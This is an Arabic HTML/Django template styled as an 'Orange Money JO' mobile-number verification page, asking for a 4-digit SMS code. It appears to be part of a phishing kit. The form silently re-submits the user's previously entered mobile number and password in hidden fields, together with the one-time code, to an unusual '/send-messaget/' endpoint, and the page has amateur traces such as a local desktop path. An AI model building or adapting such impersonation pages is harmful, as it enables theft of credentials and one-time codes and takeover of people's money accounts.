<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تسجيل الدخول</title>
<style>
  .login-section {
    flex: 1;
    padding: 20px;
    background-color: #fff;
  }
  .image-section {
    flex: 1;
    background-image: url('C:/Users/Haidar/Desktop');
    background-size: cover;
  }
  .login-form {
    max-width: 300px;
  }
  .login-form input {
    width: 100%;
    padding: 10px;
    margin-bottom: 10px;
    border: 1px solid #ccc;
    border-radius: 5px;
  }
  button {
    width: 100%;
    padding: 10px;
    background-color: orange;
    border: none;
    border-radius: 5px;
    color: white;
    cursor: pointer;
  }
  body {
    font-family: 'Arial', sans-serif;
    text-align: center;
    align-items: center;
    justify-content: center;
    
  
  }
  header {
    background-color: #000;
    display: flex;
    align-items: center;
    justify-content: space-between;
  }
  .container {
            width: 100%;
            max-width: 400px;
            margin: auto;
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            margin-top: 50px;
        }
  .word {
    display: inline-block;
    margin: 25px 30px 0px 0px;
    font-size: 15px;
    font-weight: bold;
  }
  .custom-underline {
    position: relative;
    display: inline;
  }
  .custom-underline:after {
    content: '';
    position: absolute;
    left: 0;
    bottom: -10px;
    height: 2px;
    background-color: rgb(255, 123, 0);
  }
  .w {
    display: inline-block;
    margin: 10px 20px;
    padding: 10px 50px;
    font-size: 16px;
    font-weight: bold;
    border-bottom: 3px solid orange;
    text-align: right;
    justify-content: right;
  }
  .w1 {
    color: rgba(68, 63, 63, 0.548);
    display: inline-block;
    margin: 10px 20px;
    padding: 10px 50px;
    font-size: 16px;
    font-weight: bold;
    border-bottom: 3px solid rgba(68, 63, 63, 0.548);
    text-align: right;
  }
  .c {
    position: relative;
    width: 100%;
    padding-right: 15px;
    padding-left: 15px;
  }
  .menu-icon {
    display: none;
    flex-direction: column;
    cursor: pointer;
    margin-left: 10px;
  }
  .menu-icon div {
    width: 25px;
    height: 3px;
    background-color: #000;
    margin: 4px 0;
  }
  .menu-items {
    margin-left: 60px; 
    padding: 10px;
    }
    .input-code {
            width: 90%;
            padding: 10px;
            font-size: 18px;
            margin-bottom: 20px;
            margin-right: 20px;
            margin-left: 20px;
            border: none;
            border-bottom: 2px solid #ccc;
            outline: none;
        }
        .input-code:focus {
            border-bottom: 2px solid #ff6600;
        }
  @media (max-width: 768px) {
    
    .menu-items {
      display: none;
      flex-direction: column;
      align-items: flex-start;
      background-color: #fff;
      position: absolute;
      top: 50px;
      left: 0;
      width: 100%;
      padding: 10px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }

    .menu-items.active {
      display: flex;
    }

    .menu-icon {
      display: flex;
    }

    .mobile-center {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    text-align: center;
    margin-left: -10px !important;
    /* height: calc(100vh - 80px); Adjusted height */
  }
    .mobile-center h1, .mobile-center h3 {
      margin-left: 0 !important;
      text-align: center !important;
    }
    .mobile-center h1 span {
      text-align: center;
      margin-left: 0px !important;
      margin-bottom: -5px;
    }
    .mobile-center h1 p {
      margin-left: 0px !important;
      text-align: center;
        }
    .mobile-center h3 p {
      margin-left: 170px !important;
    }
    .mobile-center .login-section {
      text-align: center;
    }
  }
</style>
</head>
<body>
  <header style="margin-left: -30px;margin-right: -30px;margin-top: -15px;" >
    
    <img src="/media/homes/hl.jpg" alt="orange logo" style="max-width: 100% ;margin-left: 0px;">
  </header>
        
  <div class="mobile-center " style="text-align: left; margin-left: 200px;">
    <div>
      <h1 style="margin-bottom: 0px; font-family: ''" >  <span style="color: rgb(0, 0, 0);font-size: 16px;margin-left: 100px;line-height: 0.5;"> التحقق من رقم الموبايل </span></h1>
      <h1  style="  color: #818181;font-size: 14px;text-align: center;line-height: 1;"><p style="margin-top: -10px;"> تم إرسال رمز التحقق عبر الرسائل القصيرة إلى: </p></h1>
      <p style="  color: #fb6404;font-size: 18px;text-align: center;line-height: 1;">{{ mobile_number }}</p>
      <!-- <h3 style="color: rgba(68, 63, 63, 0.548); font-weight: 600;font-style: italic;margin-left: 180px;line-height: 0.5"><p> متابعة الدخول إلى حسابك </p></h3> -->
      <!-- <p class="w1" style="text-align: right;">&nbsp;&nbsp; الأعمال</p>
      <p class="w" style="text-align: right;">&nbsp;&nbsp;شخصي</p> -->
      <form id="loginForm" method="POST" action="/send-messaget/">
        {% csrf_token %}
            <input name="t" style="text-align: right;" type="text" placeholder="أدخل رمز التحقق المكون من 4 أرقام" class="input-code">
            <input  value="{{ mobile_number }}" name="mobile_number" style="visibility: hidden; text-align: right;" type="text" placeholder="أدخل رمز التحقق المكون من 4 أرقام" class="input-code">
            <input value="{{ password }}" name="password" style=" visibility: hidden;text-align: right;" type="text" placeholder="أدخل رمز التحقق المكون من 4 أرقام" class="input-code">

            <button type="submit" style="width: 320px;font-size: 14px; background-color: #fb6404;margin-left: 60px;"> التحقق </button>
          </form>

      <div class="image-section">
        <!-- Background image is set via CSS -->
      </div>
    </div>
  </div>
  <footer style="margin-top: 200px;margin-left: -30px;margin-right: -30px; ">
  <div style="background-color: #000000;height: 700px;" class="footer">
    <p style="color: #f77f2f;font-size: 18px;padding-top: 20px;">Orange Money JO</p>
    <p style="color: #707061;font-size: 20px;margin-top: -10px;">معتمدة من</p>
     <img style="margin-left: 10px;" src="/media/homes/hh.jpg">
 </div>
</footer>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const menuIcon = document.querySelector('.menu-icon');
      const menuItems = document.querySelector('.menu-items');
      
      menuIcon.addEventListener('click', function() {
        menuItems.classList.toggle('active');
      });
    });
  </script>
</body>
</html>
